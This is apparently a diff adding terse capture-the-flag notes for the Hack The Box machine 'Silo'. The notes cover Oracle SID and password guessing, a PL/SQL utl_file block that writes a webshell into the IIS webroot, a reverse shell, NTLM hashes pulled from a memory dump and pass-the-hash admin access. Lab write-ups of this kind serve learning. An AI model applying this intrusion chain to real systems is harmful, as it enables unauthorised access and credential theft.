@@ -1,0 +1,56 @@
+OS:
+- Windows
+
+Open Ports:
+- PORT      STATE SERVICE
+- 80/tcp    open  http
+- 135/tcp   open  msrpc
+- 139/tcp   open  netbios-ssn
+- 445/tcp   open  microsoft-ds
+- 1521/tcp  open  oracle
+- 5985/tcp  open  wsman
+- 47001/tcp open  winrm
+- 49152/tcp open  unknown
+- 49153/tcp open  unknown
+- 49154/tcp open  unknown
+- 49155/tcp open  unknown
+- 49159/tcp open  unknown
+- 49160/tcp open  unknown
+- 49161/tcp open  unknown
+- 49162/tcp open  unknown
+
+- no access to smb shares
+- enumerating port 1521
+- running sid guesser script
+[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB
+
+- running password guesser using SID
+[+] Accounts found on 10.10.10.82:1521/XE: 
+scott/tiger 
+
+- logged into db as sysdba
+
+declare
+  f utl_file.file_type;
+  s varchar(5000) := "shellcode"
+begin
+  f := utl_file.fopen("/inetpub/wwwroot", "helloworld.txt","W");
+  utl_file.put_line(f,s);
+  utl_file.fclose(f);
+end;
+
+- using above script with aspx webshell code
+- navigated to directory in root of IIS server
+- got webshell
+- reverse shell, got user flag
+- found file with dropbox download link + password
+- downloaded file, memory dump
+- cloned repo: git clone https://github.com/volatilityfoundation/volatility3.git
+- extracted hashes: python3 vol.py -f ~/Documents/htb/silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump
+
+Administrator   500     aad3b435b51404eeaad3b435b51404ee        9e730375b7cbcebf74ae46481e07b0c7
+Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
+Phineas 1002    aad3b435b51404eeaad3b435b51404ee        8eacdd67b77749e65d3b3d5c110b0969
+
+- pass the hash with psexec
+- admin access
